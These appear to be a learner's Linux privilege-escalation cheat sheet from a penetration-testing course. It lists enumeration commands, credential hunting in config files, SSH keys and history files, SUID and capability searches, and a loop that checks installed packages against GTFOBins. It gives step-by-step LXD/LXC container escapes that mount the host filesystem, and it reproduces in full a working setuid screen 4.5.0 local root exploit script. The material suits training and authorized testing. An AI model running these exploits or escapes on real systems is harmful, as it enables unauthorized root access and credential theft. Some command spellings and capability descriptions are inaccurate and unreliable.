### Look for 
- OS Version ```cat /etc/os-release```
- Kernel Version ```cat /proc/version``` or ```unmae -a```
- Running Services 
### Basic commands to orient ourselves
- whoami - what user are we running as
- id - what groups does our user belong to?
- hostname - what is the server named. can we gather anything from the naming convention?
- ifconfig or ip -a - what subnet did we land in, does the host have additional NICs in other subnets?
- sudo -l - can our user run anything with sudo (as another user as root) without needing a password? This can sometimes be the easiest win and we can do something like sudo su and drop right into a root shell. 
### Check for current users
- PATH ```echo $PATH```
- Environment variables ```env```
- CPU info ```lscpu```
- Shells available ```cat /etc/shells```
- Block devices on system ```lsblk```
- Printers (Queued print jobs) ```lpstat```
- Mounted or unmounted drives and username, passwords for the same ```cat /etc/fstab```
- Routing table ```route``` or ```netstat -rn```
- arp table ```arp -a```
- User accounts info ```cat /etc/passwd```
- Users login shells ```grep "*sh$" /etc/passwd```
- Groups ```cat /etc/group```
- Group members ```getent group sudo```
- Mounted files ```df -h```
- Unmounted file systems ```cat /etc/fstab | grep -v "#" | column -t```
- All hidden files ```find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student```
- All hidden directories ```find / -type d -name ".*" -ls 2>/dev/null```
- Temp files ```ls -l /tmp /var/tmp /dev/shm``` 
### We should also check to see if any defenses are in place and we can enumerate any information about them. Some things to look for include:
- Exec Shield
- iptables
- AppArmor
- SELinux
- Fail2ban
- Snort
- Uncomplicated Firewall (ufw) 
In a domain environment we'll definitely want to check **/etc/resolv.conf** if the host is configured to use internal DNS we may be able to use this as a starting point to query the Active Directory environment.

**Password Hashes**
| Algorithm | Hash |
| --- | --- |
| Salted MD5 | $1$... |
| SHA-256 | $5$... |
| SHA-512 | $6$... |
| BCrypt | $2a$... |
| Scrypt | $7$... |
| Argon2 | $argon2i$... |

Checkout /home directory for users and .bash_history and hidden files and directories.  Check the ARP cache to see what other hosts are being accessed and cross-reference these against any useable SSH private keys\
Look for config files, such as files ending with .conf and .config for usernames, passwords and secrets.

### Serivce enumeration and other stuff
- User's Last Login ```lastlog ```
- Logged In Users ```w``` or ```finger``` or ```who```
- History files ```find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null```
- cron ```ls -la /etc/cron.daily/```
- Proc ```find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"```
- Installed Packages ```apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list```
- Binaries ```ls -l /bin /usr/bin/ /usr/sbin/```
- GTFO bins ```for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done```
- Trace System calls ```strace ping -c1 10.129.112.20```
- Config files ```find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null```
- Scripts ``` find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share" ```
- Running services by user ``` ps aux | grep root```
### Credential Hunting
```find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null```
SSH keys ```ls ~/.ssh```
### Escaping Restricted shells
https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/
### Special Permissions
```find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null```
```find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null```
### Sudo rights abuse
```sudo -l```
### Privilege Groups
- lxd (like a docker)
    - Use Alpine image
    - ```lxd init```
    - ```lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine```
    - ```lxc init alpine r00t -c security.privileged=true```
    - ```lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true```
    - ```lxc start r00t```
 - Docker group - can create a root docker and mount it to access root files
 - Disk group
 - ADM group - can read /var/log
### Capabilities
- Set Capability: ```sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic```
| Capability | Description |
| --- | --- |
| cap_sys_admin | Allows to perform actions with administrative privileges, such as modifying system files or changing system settings. |
| cap_sys_chroot | Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible. |
| cap_sys_ptrace | Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes. |
| cap_sys_nice | Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted. |
| cap_sys_time | Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways. |
| cap_sys_resource | Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated. |
| cap_sys_module | Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information. |
| cap_net_bind_service | Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions. |

| Capability Values | Description |
| --- | --- |
| = | This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable. |
| +ep | This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. |
| +ei | This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions. |
| +p | This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it. |

| Capability | Desciption |
| --- | --- |
| cap_setuid | Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the root user. |
| cap_setgid | Allows to set its effective group ID, which can be used to gain the privileges of another group, including the root group. |
| cap_sys_admin | This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the root user, such as modifying system settings and mounting and unmounting file systems. |

### Enumerating Capabilities
```find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;```
### Vulnerable services
Screen service is hightly vulnerable. Use screen_exploit.sh
```
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell
```
### LXC
Must be in either LXC or LXD group \ 
And if there is already a container on the system with little to no security we can import the container as follows
```lxc image import ubuntu-template.tar.xz --alias ubuntutemp
lxc image list
```
After verifying that this image has been successfully imported, we can initiate the image and configure it by specifying the security.privileged flag and the root path for the container. This flag disables all isolation features that allow us to act on the host.
```
lxc init ubuntutemp privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
Once we have done that, we can start the container and log into it. In the container, we can then go to the path we specified to access the resource of the host system as root.
```
lxc start privesc
lxc exec privesc /bin/bash
ls -l /mnt/root
```


